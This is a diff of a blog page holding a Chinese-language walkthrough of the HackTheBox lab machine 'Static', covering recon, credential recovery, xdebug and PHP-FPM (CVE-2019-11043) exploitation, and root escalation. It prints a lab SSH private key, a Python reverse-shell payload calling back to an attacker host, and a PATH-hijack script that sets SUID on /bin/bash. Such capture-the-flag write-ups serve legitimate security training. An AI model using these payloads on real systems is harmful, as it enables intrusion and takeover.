@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;355  10.10.10.246                                                                                                              端口扫描22,2222两个ssh，一个8">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;355  10.10.10.246   端口扫描22,2222两个ssh，一个8080web： 123456789101112131415161718192021222324252627$ nmap -sC -sV -Pn 10.10.10.246Host discovery disabled">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Static - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2021/06/29/Static-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;355  10.10.10.246                                                                                                              端口扫描22,2222两个ssh，一个8">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;355  10.10.10.246   端口扫描22,2222两个ssh，一个8080web： 123456789101112131415161718192021222324252627$ nmap -sC -sV -Pn 10.10.10.246Host discovery disabled">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061615.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062901.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062902.jpg">
@@ -131,8 +131,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -154,7 +161,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -222,46 +229,18 @@
 </li>
 <li><h2 id="10-10-10-246"><a href="#10-10-10-246" class="headerlink" title="10.10.10.246"></a>10.10.10.246</h2></li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061615.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061615.jpg" alt=""></p>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22,2222两个ssh，一个8080web：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.10.246</span></span><br><span class="line"></span><br><span class="line">Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-29 14:13 CST</span><br><span class="line">Nmap scan report for 10.10.10.246</span><br><span class="line">Host is up (0.080s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 16:bb:a0:a1:20:b7:82:4d:d2:9f:35:52:f4:2e:6c:90 (RSA)</span><br><span class="line">|   256 ca:ad:63:8f:30:ee:66:b1:37:9d:c5:eb:4d:44:d9:2b (ECDSA)</span><br><span class="line">|_  256 2d:43:bc:4e:b3:33:c9:82:4e:de:b6:5e:10:ca:a7:c5 (ED25519)</span><br><span class="line">2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 a9:a4:5c:e3:a9:05:54:b1:1c:ae:1b:b7:61:ac:76:d6 (RSA)</span><br><span class="line">|   256 c9:58:53:93:b3:90:9e:a0:08:aa:48:be:5e:c4:0a:94 (ECDSA)</span><br><span class="line">|_  256 c7:07:2b:07:43:4f:ab:c8:da:57:7f:ea:b5:50:21:bd (ED25519)</span><br><span class="line">8080/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">| http-robots.txt: 2 disallowed entries</span><br><span class="line">|_/vpn/ /.ftp_uploads/</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html; charset=UTF-8).</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 85.48 seconds</span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h2><p>直接访问是空白,robots.txt得到两个目录：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062901.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062901.jpg" alt=""></p>
 <h2 id="vpn"><a href="#vpn" class="headerlink" title="vpn"></a>vpn</h2><p>需要账号密码：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062902.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062902.jpg" alt=""></p>
 <h2 id="ftp-uploads"><a href="#ftp-uploads" class="headerlink" title=".ftp_uploads"></a>.ftp_uploads</h2><p>一个gz文件和一个txt，txt说明gz文件因为ftp传输模式损坏，需要修复：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062903.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062903.jpg" alt=""></p>
 <h1 id="fixgz"><a href="#fixgz" class="headerlink" title="fixgz"></a>fixgz</h1><p>搜到这个：</p>
 <ul>
 <li><a href="https://github.com/yonjar/fixgz" target="_blank" rel="noopener">https://github.com/yonjar/fixgz</a></li>
@@ -269,126 +248,42 @@
 <p>根据代码就是换行符问题，修复后解压得到账号密码及OTP secret,密码解hash就是admin：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">d033e22ae348aeb5660fc2140aec35850c4da997 (admin)</span><br><span class="line">orxxi4c7orxwwzlo</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062904.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062904.jpg" alt=""></p>
 <h1 id="vpn-1"><a href="#vpn-1" class="headerlink" title="vpn"></a>vpn</h1><p>登录前面的vpn，需要2FA，我们已经得到了secret，就可以自己生成otp,登录进去：</p>
 <ul>
 <li><a href="https://addons.mozilla.org/en-US/firefox/addon/auth-helper/" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/auth-helper/</a></li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062905.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062906.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062905.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062906.jpg" alt=""></p>
 <p>可以生成vpn文件,根据文件内容把域名加hosts后连接：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.246    vpn.static.htb</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062907.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062907.jpg" alt=""></p>
 <h2 id="route"><a href="#route" class="headerlink" title="route"></a>route</h2><p>连接后分配到一个ip，可以去访问web上显示的那些资源，但首先需要配置下路由，因为那些ip段本地也存在：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062908.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062908.jpg" alt=""></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ip route add 172.20.0.0/24 dev utun3</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> mac系统这样加</span></span><br><span class="line">sudo route -n add -net 172.20.0.0 -netmask 255.255.255.0 172.30.0.9</span><br></pre></td></tr></table></figure>
 
 <h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>添加路由后去访问web，info.php发现xdebug 2.6：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062909.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062910.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062909.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062910.jpg" alt=""></p>
 <h1 id="xdebug-unearth-rce"><a href="#xdebug-unearth-rce" class="headerlink" title="xdebug unearth rce"></a>xdebug unearth rce</h1><p>搜到这个，打到www-data:</p>
 <ul>
 <li>xdebug Unauthenticated OS Command Execution<br><a href="https://www.rapid7.com/db/modules/exploit/unix/http/xdebug_unauth_exec/" target="_blank" rel="noopener">https://www.rapid7.com/db/modules/exploit/unix/http/xdebug_unauth_exec/</a></li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062911.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062911.jpg" alt=""></p>
 <p>www-data用户目录可以发现ssh私钥：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062912.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062912.jpg" alt=""></p>
 <h2 id="www-data-id-rsa"><a href="#www-data-id-rsa" class="headerlink" title="www-data-id_rsa"></a>www-data-id_rsa</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEowIBAAKCAQEA0pNa5qwGZ+DKsS60GPhNfCqZti7z1xPzxOTXwtwO9uYzZpq&#x2F;</span><br><span class="line">nrhzgJq0nQNVRUbaiZ+H6gR1OreDyjr9YorV2kJqccscBPZ59RAhttaQsBqHkGjJ</span><br><span class="line">QEHYKteL1D+hJ80NDd7fJTtQgzT4yBDwrVKwIUSETMfWgzJ5z24LN5s&#x2F;rcQYgl3i</span><br><span class="line">VKmls3lsod8ilakdDoYEYt12L4ST&#x2F;exEoVl0AyD9y8m651q40k1Gz4WzPnaHAlnj</span><br><span class="line">mL6CANfiNAJoc8WnqZN5ruSrWhmivmDbKLlDCO5bCCzi2zMHJKqQkcBxdWk60Qhi</span><br><span class="line">17UJMV3mKVQRprvpeTR2jCMykH81n2KU46doSQIDAQABAoIBAADCHxWtkOhW2uQA</span><br><span class="line">cw2T91N3I86QJLiljb8rw8sj17nz4kOAUyhTKbdQ102pcWkqdCcCuA6TrYhkmMjl</span><br><span class="line">pXvxXAvJKXD3dkZeTNohEL4Dz8mSjuJqPi9JDWo6FHrTL9Vg26ctIkiUChou2qZ9</span><br><span class="line">ySAWqCO2h3NvVMpsKBwjHU858+TASlo4j03FJOdmROmUelcqmRimWxgneHBAHEZj</span><br><span class="line">GqDuPjmPmw7pbThqlETyosrbaB3rROzUp9CKAHzYB1BvOTImDsb6qQ+GdKwewAQf</span><br><span class="line">j60myPuxl4qgY8O2yqLFUH3&#x2F;ovtPTKqHJSUFBO23wzS1qPLupzu1GVXwlsdlhRWA</span><br><span class="line">Amvx+AECgYEA6OOd9dgqXR&#x2F;vBaxDngWB6ToVysWDjO+QsjO4OpFo7AvGhMRR+WpK</span><br><span class="line">qbZyJG1iQB0nlAHgYHEFj4It9iI6NCdTkKyg2UzZJMKJgErfgI0Svkh&#x2F;Kdls23Ny</span><br><span class="line">gxpacxW3d2RlyAv4m2hG4n82+DsoPcN+6KxqGRQxWywXtsBsYkRb+wkCgYEA53jg</span><br><span class="line">+1CfGEH&#x2F;N2TptK2CCUGB28X1eL0wDs83RsU7Nbz2ASVQj8K0MlVzR9CRCY5y6jcq</span><br><span class="line">te1YYDiuFvT+17ENSe5fDtNiF1LEDfp45K6s4YU79DMp6Ot84c2fBDIh8ogH0D7C</span><br><span class="line">CFdjXCI3SIlvc8miyivjRHoyJYJz&#x2F;cO94DsTE0ECgYA1HlWVEWz4OKRoAtaZYGA1</span><br><span class="line">Ng5qZYqPxsSWIL3QfgIUdMse1ThtTxUgiICYVmqmfP&#x2F;d&#x2F;l+TH7RI+0RIc54a7y1c</span><br><span class="line">PkOhzKlqfQSnwmwgAg1YYWi&#x2F;vtvZYgeoZ4Zh4X4rOTcN3c0ihTJFzwZWsAeJruFv</span><br><span class="line">aIP6nGR1iyUNhe4yq6zfIQKBgANYQNAA2zurgHeZcrMUqsNdefXmB2UGPtKH9gGE</span><br><span class="line">yhU9tMRReLeLFbWAfJj2D5J2x3xQ7cIROuyxBPr58VDGky2VTzRUo584p&#x2F;KXwvVy</span><br><span class="line">&#x2F;LaJiVM&#x2F;BgUCmhxdL0YNP2ZUxuAgeAdM0&#x2F;e52time8DNkhefyLntlhnqp6hsEqtR</span><br><span class="line">zzXBAoGBANB6Wdk&#x2F;X3riJ50Bia9Ai7&#x2F;rdXUpAa2B4pXARnP1&#x2F;tw7krfPM&#x2F;SCMABe</span><br><span class="line">sjZU9eeOecWbg+B6RWQTNcxo&#x2F;cRjMpxd5hRaANYhcFXGuxcg1N3nszhWDpHIpGr+</span><br><span class="line">s5Mwc3oopgv6gMmetHMr0mcGz6OR9KsH8FvW1y+DYY3tUdgx0gau</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>www-data使用私钥ssh登录，端口是2222那个，user.txt在上层目录:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062913.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062913.jpg" alt=""></p>
 <h1 id="pki"><a href="#pki" class="headerlink" title="pki"></a>pki</h1><p>查看ip发现双网卡，vpn界面也能看到pki是另一个网段的：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062914.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062914.jpg" alt=""></p>
 <p>所以把pki转发出来访问：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 8080:192.168.254.3:80 www-data@10.10.10.246 -p2222 -i www-data_id_rsa</span><br></pre></td></tr></table></figure>
 
 <p>根据说明大概是管理ovpn文件的</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062915.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062915.jpg" alt=""></p>
 <h1 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h1><p>pki的响应header发现是PHP-FPM/7.1，搜到：</p>
 <ul>
 <li>PHP-FPM Remote Code Execution Vulnerability (CVE-2019–11043) Analysis | by Knownsec 404 team | Medium<br><a href="https://medium.com/@knownsec404team/php-fpm-remote-code-execution-vulnerability-cve-2019-11043-analysis-35fd605dd2dc" target="_blank" rel="noopener">https://medium.com/@knownsec404team/php-fpm-remote-code-execution-vulnerability-cve-2019-11043-analysis-35fd605dd2dc</a></li>
@@ -400,33 +295,12 @@
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># local</span><br><span class="line">scp -P 2222 -i www-data_id_rsa exploit.py www-data@10.10.10.246:&#x2F;tmp&#x2F;exploit.py</span><br><span class="line">scp -P 2222 -i www-data_id_rsa nc www-data@10.10.10.246:&#x2F;tmp&#x2F;nc</span><br><span class="line">scp -P 2222 -i www-data_id_rsa shell.py www-data@10.10.10.246:&#x2F;tmp&#x2F;shell.py</span><br><span class="line"></span><br><span class="line"># web www-data shell</span><br><span class="line">python3 exploit.py --url http:&#x2F;&#x2F;192.168.254.3&#x2F;index.php</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062916.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062917.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062916.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062917.jpg" alt=""></p>
 <h2 id="shell-py"><a href="#shell-py" class="headerlink" title="shell.py"></a>shell.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/usr/bin/python3.6 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.254.2",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\''</span></span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">"http://192.168.254.3/index.php?a="</span>+payload)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
 
 <h1 id="ersatool"><a href="#ersatool" class="headerlink" title="ersatool"></a>ersatool</h1><p>根据信息去查看ersatool，并且可以直接查看源码：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062918.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062918.jpg" alt=""></p>
 <p>根据代码分析可以知道格式化字符串，也可以pspy64之类的分析调用，没有curl，wget之类的，可以通过bash实现：</p>
 <ul>
 <li><a href="https://unix.stackexchange.com/questions/83926/how-to-download-a-file-using-just-bash-and-nothing-else-no-curl-wget-perl-et" target="_blank" rel="noopener">https://unix.stackexchange.com/questions/83926/how-to-download-a-file-using-just-bash-and-nothing-else-no-curl-wget-perl-et</a></li>
@@ -441,22 +315,8 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cat openssl | base64</span><br><span class="line">IyEvYmluL2Jhc2gKY2htb2QgdStzIC9iaW4vYmFzaAoK</span><br><span class="line"></span><br><span class="line">echo &quot;IyEvYmluL2Jhc2gKY2htb2QgdStzIC9iaW4vYmFzaAoK&quot; | base64 -d &gt; openssl</span><br><span class="line"></span><br><span class="line">export PATH&#x3D;&#x2F;tmp&#x2F;miao:$PATH</span><br></pre></td></tr></table></figure>
 
 <p>然后运行ersatool，随意create一个使其调用openssl，推出发现bash加上了suid，执行，读取root.txt：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062919.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062920.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062919.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062920.jpg" alt=""></p>
 <h2 id="openssl"><a href="#openssl" class="headerlink" title="openssl"></a>openssl</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">chmod u+s &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
 
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
@@ -478,7 +338,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2021-12-21T08:53:08.748Z" itemprop="dateUpdated">2021-12-21 16:53:08</time>
+    Last updated: <time datetime="2021-12-21T08:53:08.748Z" itemprop="dateUpdated">2021-12-21 16:53:08</time>
 </span><br>
 
 
@@ -645,11 +505,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
